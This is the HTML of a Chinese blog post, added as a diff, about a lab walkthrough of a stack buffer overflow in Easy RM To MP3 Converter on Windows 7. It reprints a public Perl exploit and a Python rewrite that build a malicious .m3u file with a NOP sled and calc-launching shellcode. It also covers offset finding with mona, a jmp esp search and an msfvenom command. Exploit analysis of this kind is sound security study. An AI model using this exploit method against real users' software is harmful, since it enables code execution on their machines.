@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="exploit-db地址：https://www.exploit-db.com/exploits/9186 packetstormsecurity地址：https://packetstormsecurity.com/files/79357/Easy-RM-To-MP3-Converter-Stack-Overflow.html 0x01 实验环境   软件 版本     操作系统 cn_windo">
+<meta name="keywords" content="栈溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Easy RM To MP3 Converter Stack Overflow">
+<meta property="og:url" content="http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/index.html">
+<meta property="og:site_name" content="Yuewei.Liang">
+<meta property="og:description" content="exploit-db地址：https://www.exploit-db.com/exploits/9186 packetstormsecurity地址：https://packetstormsecurity.com/files/79357/Easy-RM-To-MP3-Converter-Stack-Overflow.html 0x01 实验环境   软件 版本     操作系统 cn_windo">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://liangyuewei.com/images/stack_over/1.png">
+<meta property="og:image" content="http://liangyuewei.com/images/stack_over/2.png">
+<meta property="og:image" content="http://liangyuewei.com/images/stack_over/3.png">
+<meta property="og:image" content="http://liangyuewei.com/images/stack_over/4.png">
+<meta property="og:image" content="http://liangyuewei.com/images/stack_over/5.png">
+<meta property="og:image" content="http://liangyuewei.com/images/stack_over/6.png">
+<meta property="og:image" content="http://liangyuewei.com/images/stack_over/7.png">
+<meta property="og:image" content="http://liangyuewei.com/images/stack_over/8.png">
+<meta property="og:image" content="http://liangyuewei.com/images/stack_over/9.png">
+<meta property="og:image" content="http://liangyuewei.com/images/stack_over/10.png">
+<meta property="og:image" content="http://liangyuewei.com/images/stack_over/11.png">
+<meta property="og:image" content="http://liangyuewei.com/images/stack_over/12.png">
+<meta property="og:image" content="http://liangyuewei.com/images/stack_over/13.png">
+<meta property="og:image" content="http://liangyuewei.com/images/stack_over/14.png">
+<meta property="og:image" content="http://liangyuewei.com/images/stack_over/15.png">
+<meta property="og:image" content="http://liangyuewei.com/images/stack_over/16.png">
+<meta property="og:image" content="http://liangyuewei.com/images/stack_over/17.png">
+<meta property="og:image" content="http://liangyuewei.com/images/stack_over/18.png">
+<meta property="og:image" content="http://liangyuewei.com/images/stack_over/19.png">
+<meta property="og:updated_time" content="2019-11-16T08:34:21.510Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Easy RM To MP3 Converter Stack Overflow">
+<meta name="twitter:description" content="exploit-db地址：https://www.exploit-db.com/exploits/9186 packetstormsecurity地址：https://packetstormsecurity.com/files/79357/Easy-RM-To-MP3-Converter-Stack-Overflow.html 0x01 实验环境   软件 版本     操作系统 cn_windo">
+<meta name="twitter:image" content="http://liangyuewei.com/images/stack_over/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Easy RM To MP3 Converter Stack Overflow</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/11/16/DNSTracer1.9 栈溢出漏洞 CVE-2017-9430/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/11/16/pwntools-工具安装/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/&text=Easy RM To MP3 Converter Stack Overflow"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/&title=Easy RM To MP3 Converter Stack Overflow"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/&is_video=false&description=Easy RM To MP3 Converter Stack Overflow"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Easy RM To MP3 Converter Stack Overflow&body=Check out this article: http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/&title=Easy RM To MP3 Converter Stack Overflow"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/&title=Easy RM To MP3 Converter Stack Overflow"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/&title=Easy RM To MP3 Converter Stack Overflow"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/&title=Easy RM To MP3 Converter Stack Overflow"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/&name=Easy RM To MP3 Converter Stack Overflow&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-实验环境"><span class="toc-number">1.</span> <span class="toc-text">0x01 实验环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-详细调试步骤"><span class="toc-number">2.</span> <span class="toc-text">0x02 详细调试步骤</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Easy RM To MP3 Converter Stack Overflow
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Yuewei.Liang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-11-16T08:09:15.000Z" itemprop="datePublished">2019-11-16</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/栈溢出/">栈溢出</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>exploit-db地址：<a href="https://www.exploit-db.com/exploits/9186" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/9186</a></p>
+<p>packetstormsecurity地址：<a href="https://packetstormsecurity.com/files/79357/Easy-RM-To-MP3-Converter-Stack-Overflow.html" target="_blank" rel="noopener">https://packetstormsecurity.com/files/79357/Easy-RM-To-MP3-Converter-Stack-Overflow.html</a></p>
+<h3 id="0x01-实验环境"><a href="#0x01-实验环境" class="headerlink" title="0x01 实验环境"></a>0x01 实验环境</h3><table>
+<thead>
+<tr>
+<th>软件</th>
+<th>版本</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>cn_windows_7_enterprise_x86_dvd_x15-70737</td>
+</tr>
+<tr>
+<td>vmware</td>
+<td>VMWare  Fusion 专业版 10.1.0 (7370838)</td>
+</tr>
+<tr>
+<td>windbg</td>
+<td>WinDbg:6.12.0002.633  X86</td>
+</tr>
+<tr>
+<td>Easy RM To MP3 Converter</td>
+<td>2.7.3.700</td>
+</tr>
+</tbody>
+</table>
+<h3 id="0x02-详细调试步骤"><a href="#0x02-详细调试步骤" class="headerlink" title="0x02 详细调试步骤"></a>0x02 详细调试步骤</h3><p>下载 Easy RM To MP3 安装包后进行直接进行安装</p>
+<p><img src="/images/stack_over/1.png" alt="1"></p>
+<p>Exploit-DB 上公开的 exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="comment"># Easy RM to MP3 Converter .m3u file Universall Stack Overflow Exploit</span></span><br><span class="line"><span class="comment"># it's so diferent to the first exploit .pls</span></span><br><span class="line"><span class="comment"># by stack</span></span><br><span class="line"><span class="comment"># xd Alpha zrebti 3liha :d</span></span><br><span class="line"><span class="comment"># Thnx to Zigma &amp; His0k4 &amp; HOD</span></span><br><span class="line">my $header= <span class="string">"\x23\x45\x58\x54\x4D\x33\x55\x0D\x0A\x23\x45\x58\x54\x49\x4E\x46"</span>.</span><br><span class="line">      <span class="string">"\x3A\x33\x3A\x35\x30\x2C\x4C\x61\x6D\x62\x20\x4F\x66\x20\x47\x6F"</span>.</span><br><span class="line">      <span class="string">"\x64\x20\x2D\x20\x53\x65\x74\x20\x54\x6F\x20\x46\x61\x69\x6C\x20"</span>.</span><br><span class="line">      <span class="string">"\x0D\x0A\x44\x3A\x5C"</span>;</span><br><span class="line"> </span><br><span class="line">my $junk = <span class="string">"\x41"</span> x <span class="number">1293</span>;</span><br><span class="line">my $ret  = <span class="string">"\xDB\x70\xBB\x01"</span>; <span class="comment"># Universal return adress :d</span></span><br><span class="line">my $nop  = <span class="string">"\x90"</span> x <span class="number">220</span>;</span><br><span class="line"><span class="comment"># win32_exec - EXITFUNC=seh CMD=calc.exe Size=351 Encoder=PexAlphaNum http://metasploit.com</span></span><br><span class="line">my $calc_shell =</span><br><span class="line">  <span class="string">"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"</span>.</span><br><span class="line">  <span class="string">"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"</span>.</span><br><span class="line">  <span class="string">"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"</span>.</span><br><span class="line">  <span class="string">"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"</span>.</span><br><span class="line">  <span class="string">"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"</span>.</span><br><span class="line">  <span class="string">"\x42\x50\x42\x50\x42\x30\x4b\x48\x45\x34\x4e\x43\x4b\x38\x4e\x47"</span>.</span><br><span class="line">  <span class="string">"\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x48\x4f\x34\x4a\x51\x4b\x48"</span>.</span><br><span class="line">  <span class="string">"\x4f\x55\x42\x52\x41\x50\x4b\x4e\x49\x34\x4b\x48\x46\x53\x4b\x48"</span>.</span><br><span class="line">  <span class="string">"\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"</span>.</span><br><span class="line">  <span class="string">"\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x50\x44\x4c\x4b\x4e"</span>.</span><br><span class="line">  <span class="string">"\x46\x4f\x4b\x53\x46\x55\x46\x52\x46\x30\x45\x37\x45\x4e\x4b\x38"</span>.</span><br><span class="line">  <span class="string">"\x4f\x45\x46\x32\x41\x30\x4b\x4e\x48\x56\x4b\x38\x4e\x50\x4b\x54"</span>.</span><br><span class="line">  <span class="string">"\x4b\x48\x4f\x45\x4e\x51\x41\x30\x4b\x4e\x4b\x58\x4e\x41\x4b\x58"</span>.</span><br><span class="line">  <span class="string">"\x41\x50\x4b\x4e\x49\x48\x4e\x45\x46\x42\x46\x30\x43\x4c\x41\x43"</span>.</span><br><span class="line">  <span class="string">"\x42\x4c\x46\x36\x4b\x58\x42\x34\x42\x33\x45\x48\x42\x4c\x4a\x57"</span>.</span><br><span class="line">  <span class="string">"\x4e\x30\x4b\x48\x42\x44\x4e\x30\x4b\x48\x42\x47\x4e\x41\x4d\x4a"</span>.</span><br><span class="line">  <span class="string">"\x4b\x48\x4a\x46\x4a\x50\x4b\x4e\x49\x30\x4b\x58\x42\x38\x42\x4b"</span>.</span><br><span class="line">  <span class="string">"\x42\x50\x42\x50\x42\x30\x4b\x48\x4a\x36\x4e\x53\x4f\x45\x41\x33"</span>.</span><br><span class="line">  <span class="string">"\x48\x4f\x42\x36\x48\x45\x49\x48\x4a\x4f\x43\x38\x42\x4c\x4b\x47"</span>.</span><br><span class="line">  <span class="string">"\x42\x55\x4a\x46\x42\x4f\x4c\x38\x46\x50\x4f\x55\x4a\x36\x4a\x39"</span>.</span><br><span class="line">  <span class="string">"\x50\x4f\x4c\x38\x50\x50\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x36"</span>.</span><br><span class="line">  <span class="string">"\x4e\x56\x43\x36\x50\x32\x45\x36\x4a\x57\x45\x56\x42\x30\x5a"</span>;</span><br><span class="line"> </span><br><span class="line">$id = $ARGV[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> ($id==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$header$junk$ret$nop$calc_shell"</span>;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">" +++                               +++\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">" +++                               +++\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">" +++ Easy RM to MP3 Converter Universall Stack Overflow Exploit  +++\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">" +++ Written By Stack                       +++\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">" +++                               +++\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">" +++  Usage Ex.: perl $0 1 &gt;&gt;Exploit.m3u             +++\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">" +++                               +++\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"</span>;</span><br><span class="line">exit;</span><br><span class="line"><span class="comment">#EOF</span></span><br></pre></td></tr></table></figure>
+<p>从作者的代码注释中可以了解到：header 和 junk 用于填充ESP 和 EBP 之间的内存空间，\xDB\x70\xBB\x01可以理解为 “jmp esp ” 指令地址，之后是220个 nop 指令和弹出计算器的 shellcode 指令。</p>
+<p>根据作者公开的 exp 改写成 Python 脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line">header = <span class="string">"\x23\x45\x58\x54\x4D\x33\x55\x0D\x0A\x23\x45\x58\x54\x49\x4E\x46"</span> </span><br><span class="line">header += <span class="string">"\x3A\x33\x3A\x35\x30\x2C\x4C\x61\x6D\x62\x20\x4F\x66\x20\x47\x6F"</span></span><br><span class="line">header += <span class="string">"\x64\x20\x2D\x20\x53\x65\x74\x20\x54\x6F\x20\x46\x61\x69\x6C\x20"</span></span><br><span class="line">header += <span class="string">"\x0D\x0A\x44\x3A\x5C"</span></span><br><span class="line"> </span><br><span class="line">junk = <span class="string">"\x41"</span> * <span class="number">1293</span></span><br><span class="line">ret = <span class="string">"\xDB\x70\xBB\x01"</span></span><br><span class="line">nop = <span class="string">"\x90"</span> * <span class="number">220</span></span><br><span class="line"> </span><br><span class="line">calc_shell = <span class="string">"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"</span></span><br><span class="line">calc_shell += <span class="string">"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"</span></span><br><span class="line">calc_shell += <span class="string">"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"</span></span><br><span class="line">calc_shell += <span class="string">"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"</span></span><br><span class="line">calc_shell += <span class="string">"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"</span></span><br><span class="line">calc_shell += <span class="string">"\x42\x50\x42\x50\x42\x30\x4b\x48\x45\x34\x4e\x43\x4b\x38\x4e\x47"</span></span><br><span class="line">calc_shell += <span class="string">"\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x48\x4f\x34\x4a\x51\x4b\x48"</span></span><br><span class="line">calc_shell += <span class="string">"\x4f\x55\x42\x52\x41\x50\x4b\x4e\x49\x34\x4b\x48\x46\x53\x4b\x48"</span></span><br><span class="line">calc_shell += <span class="string">"\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"</span></span><br><span class="line">calc_shell += <span class="string">"\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x50\x44\x4c\x4b\x4e"</span></span><br><span class="line">calc_shell += <span class="string">"\x46\x4f\x4b\x53\x46\x55\x46\x52\x46\x30\x45\x37\x45\x4e\x4b\x38"</span></span><br><span class="line">calc_shell += <span class="string">"\x4f\x45\x46\x32\x41\x30\x4b\x4e\x48\x56\x4b\x38\x4e\x50\x4b\x54"</span></span><br><span class="line">calc_shell += <span class="string">"\x4b\x48\x4f\x45\x4e\x51\x41\x30\x4b\x4e\x4b\x58\x4e\x41\x4b\x58"</span></span><br><span class="line">calc_shell += <span class="string">"\x41\x50\x4b\x4e\x49\x48\x4e\x45\x46\x42\x46\x30\x43\x4c\x41\x43"</span></span><br><span class="line">calc_shell += <span class="string">"\x42\x4c\x46\x36\x4b\x58\x42\x34\x42\x33\x45\x48\x42\x4c\x4a\x57"</span></span><br><span class="line">calc_shell += <span class="string">"\x4e\x30\x4b\x48\x42\x44\x4e\x30\x4b\x48\x42\x47\x4e\x41\x4d\x4a"</span></span><br><span class="line">calc_shell += <span class="string">"\x4b\x48\x4a\x46\x4a\x50\x4b\x4e\x49\x30\x4b\x58\x42\x38\x42\x4b"</span></span><br><span class="line">calc_shell += <span class="string">"\x42\x50\x42\x50\x42\x30\x4b\x48\x4a\x36\x4e\x53\x4f\x45\x41\x33"</span></span><br><span class="line">calc_shell += <span class="string">"\x48\x4f\x42\x36\x48\x45\x49\x48\x4a\x4f\x43\x38\x42\x4c\x4b\x47"</span></span><br><span class="line">calc_shell += <span class="string">"\x42\x55\x4a\x46\x42\x4f\x4c\x38\x46\x50\x4f\x55\x4a\x36\x4a\x39"</span></span><br><span class="line">calc_shell += <span class="string">"\x50\x4f\x4c\x38\x50\x50\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x36"</span></span><br><span class="line">calc_shell += <span class="string">"\x4e\x56\x43\x36\x50\x32\x45\x36\x4a\x57\x45\x56\x42\x30\x5a"</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">  <span class="keyword">print</span> <span class="string">'usage: python '</span> + sys.argv[<span class="number">0</span>] +<span class="string">' name.m3u'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  <span class="keyword">with</span> open(sys.argv[<span class="number">1</span>],<span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(header + junk + ret + nop + calc_shell)</span><br></pre></td></tr></table></figure>
+<p>重新生成一个新的 evil1.m3u 文件</p>
+<p> <img src="/images/stack_over/2.png" alt="2"></p>
+<p>加载 evil1.m3u 文件，程序弹出对话框提示错误，说明该 exp 在该环境中无法使用。</p>
+<p><img src="/images/stack_over/3.png" alt="3"></p>
+<p>要想在该环境中成功执行 shellcode，需要几个要点：</p>
+<ol>
+<li>定位ret eip 地址</li>
+<li>找到稳定的 jmp esp 地址</li>
+<li>shellcode 能正确地址</li>
+</ol>
+<p>定位ret eip 地址，可以使用 windbg 的 mona 插件。</p>
+<p>. load pykd.pyd</p>
+<p>!py mona patten_create 30000</p>
+<p>  <img src="/images/stack_over/4.png" alt="4"></p>
+<p>用生成HEX的 30000 字节为 junk 变量</p>
+<p> <img src="/images/stack_over/5.png" alt="5"></p>
+<p>重新生成 evil2.m3u，并用 windbg 附加到进程中，查看 ret地址</p>
+<p><img src="/images/stack_over/6.png" alt="6"></p>
+<p>先运行 Easy RM To MP3 程序，然后附加到进程中。</p>
+<p><img src="/images/stack_over/7.png" alt="7"></p>
+<p><img src="/images/stack_over/8.png" alt="8"></p>
+<p>在命令框中输入 g 运行程序程序，之后加载 evil2.m3u 文件，发现 ret 的偏移地址为 “\x48\x6d\x33\x48”</p>
+<p><img src="/images/stack_over/9.png" alt="9"></p>
+<p>使用 mona 提供的 pattern_offset 插件，可以得到偏移地址为 5829 </p>
+<p><img src="/images/stack_over/10.png" alt="10"></p>
+<p>加成 20280 的偏移可以得到最终的偏移为 26109 (junk 偏移为 26105，其中 4 位留给 ebp）</p>
+<p><img src="/images/stack_over/11.png" alt="11"></p>
+<p>重新生成 evil3.m3u 文件，按照布局，ret 的地址应该为0x43434343:</p>
+<p><img src="/images/stack_over/12.png" alt="12"></p>
+<p>此时，esp 的地址为 0x000ff660</p>
+<p><img src="/images/stack_over/13.png" alt="13"></p>
+<p>使用 mona 插件的 jmp -r esp -m kernel32.dll 查找 “jmp esp ”指令</p>
+<p><img src="/images/stack_over/14.png" alt="14"></p>
+<p>选择 0x7576f7f7 作为 jmp esp 指令，用 0x7576f7f7覆盖 ret addr，shellcode 暂设为 \xcc 指令</p>
+<p><img src="/images/stack_over/15.png" alt="15"></p>
+<p>生成 evil4.m3u 文件再次测试，程序在 int 3 指令处暂停</p>
+<p><img src="/images/stack_over/16.png" alt="16"></p>
+<p>使用 msf 生成一段弹出计算器的 shellcode: </p>
+<p>msfvenom -p windows/exec CMD=”calc” -f c -b “\x00\x0a”</p>
+<p><img src="/images/stack_over/17.png" alt="17"></p>
+<p>最终的 exp 为：</p>
+<p><img src="/images/stack_over/18.png" alt="18"></p>
+<p>重新生成 evil5.m3u 文件，再测试后发现可以弹出计算器。</p>
+<p><img src="/images/stack_over/19.png" alt="19"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-实验环境"><span class="toc-number">1.</span> <span class="toc-text">0x01 实验环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-详细调试步骤"><span class="toc-number">2.</span> <span class="toc-text">0x02 详细调试步骤</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/&text=Easy RM To MP3 Converter Stack Overflow"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/&title=Easy RM To MP3 Converter Stack Overflow"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/&is_video=false&description=Easy RM To MP3 Converter Stack Overflow"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Easy RM To MP3 Converter Stack Overflow&body=Check out this article: http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/&title=Easy RM To MP3 Converter Stack Overflow"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/&title=Easy RM To MP3 Converter Stack Overflow"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/&title=Easy RM To MP3 Converter Stack Overflow"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
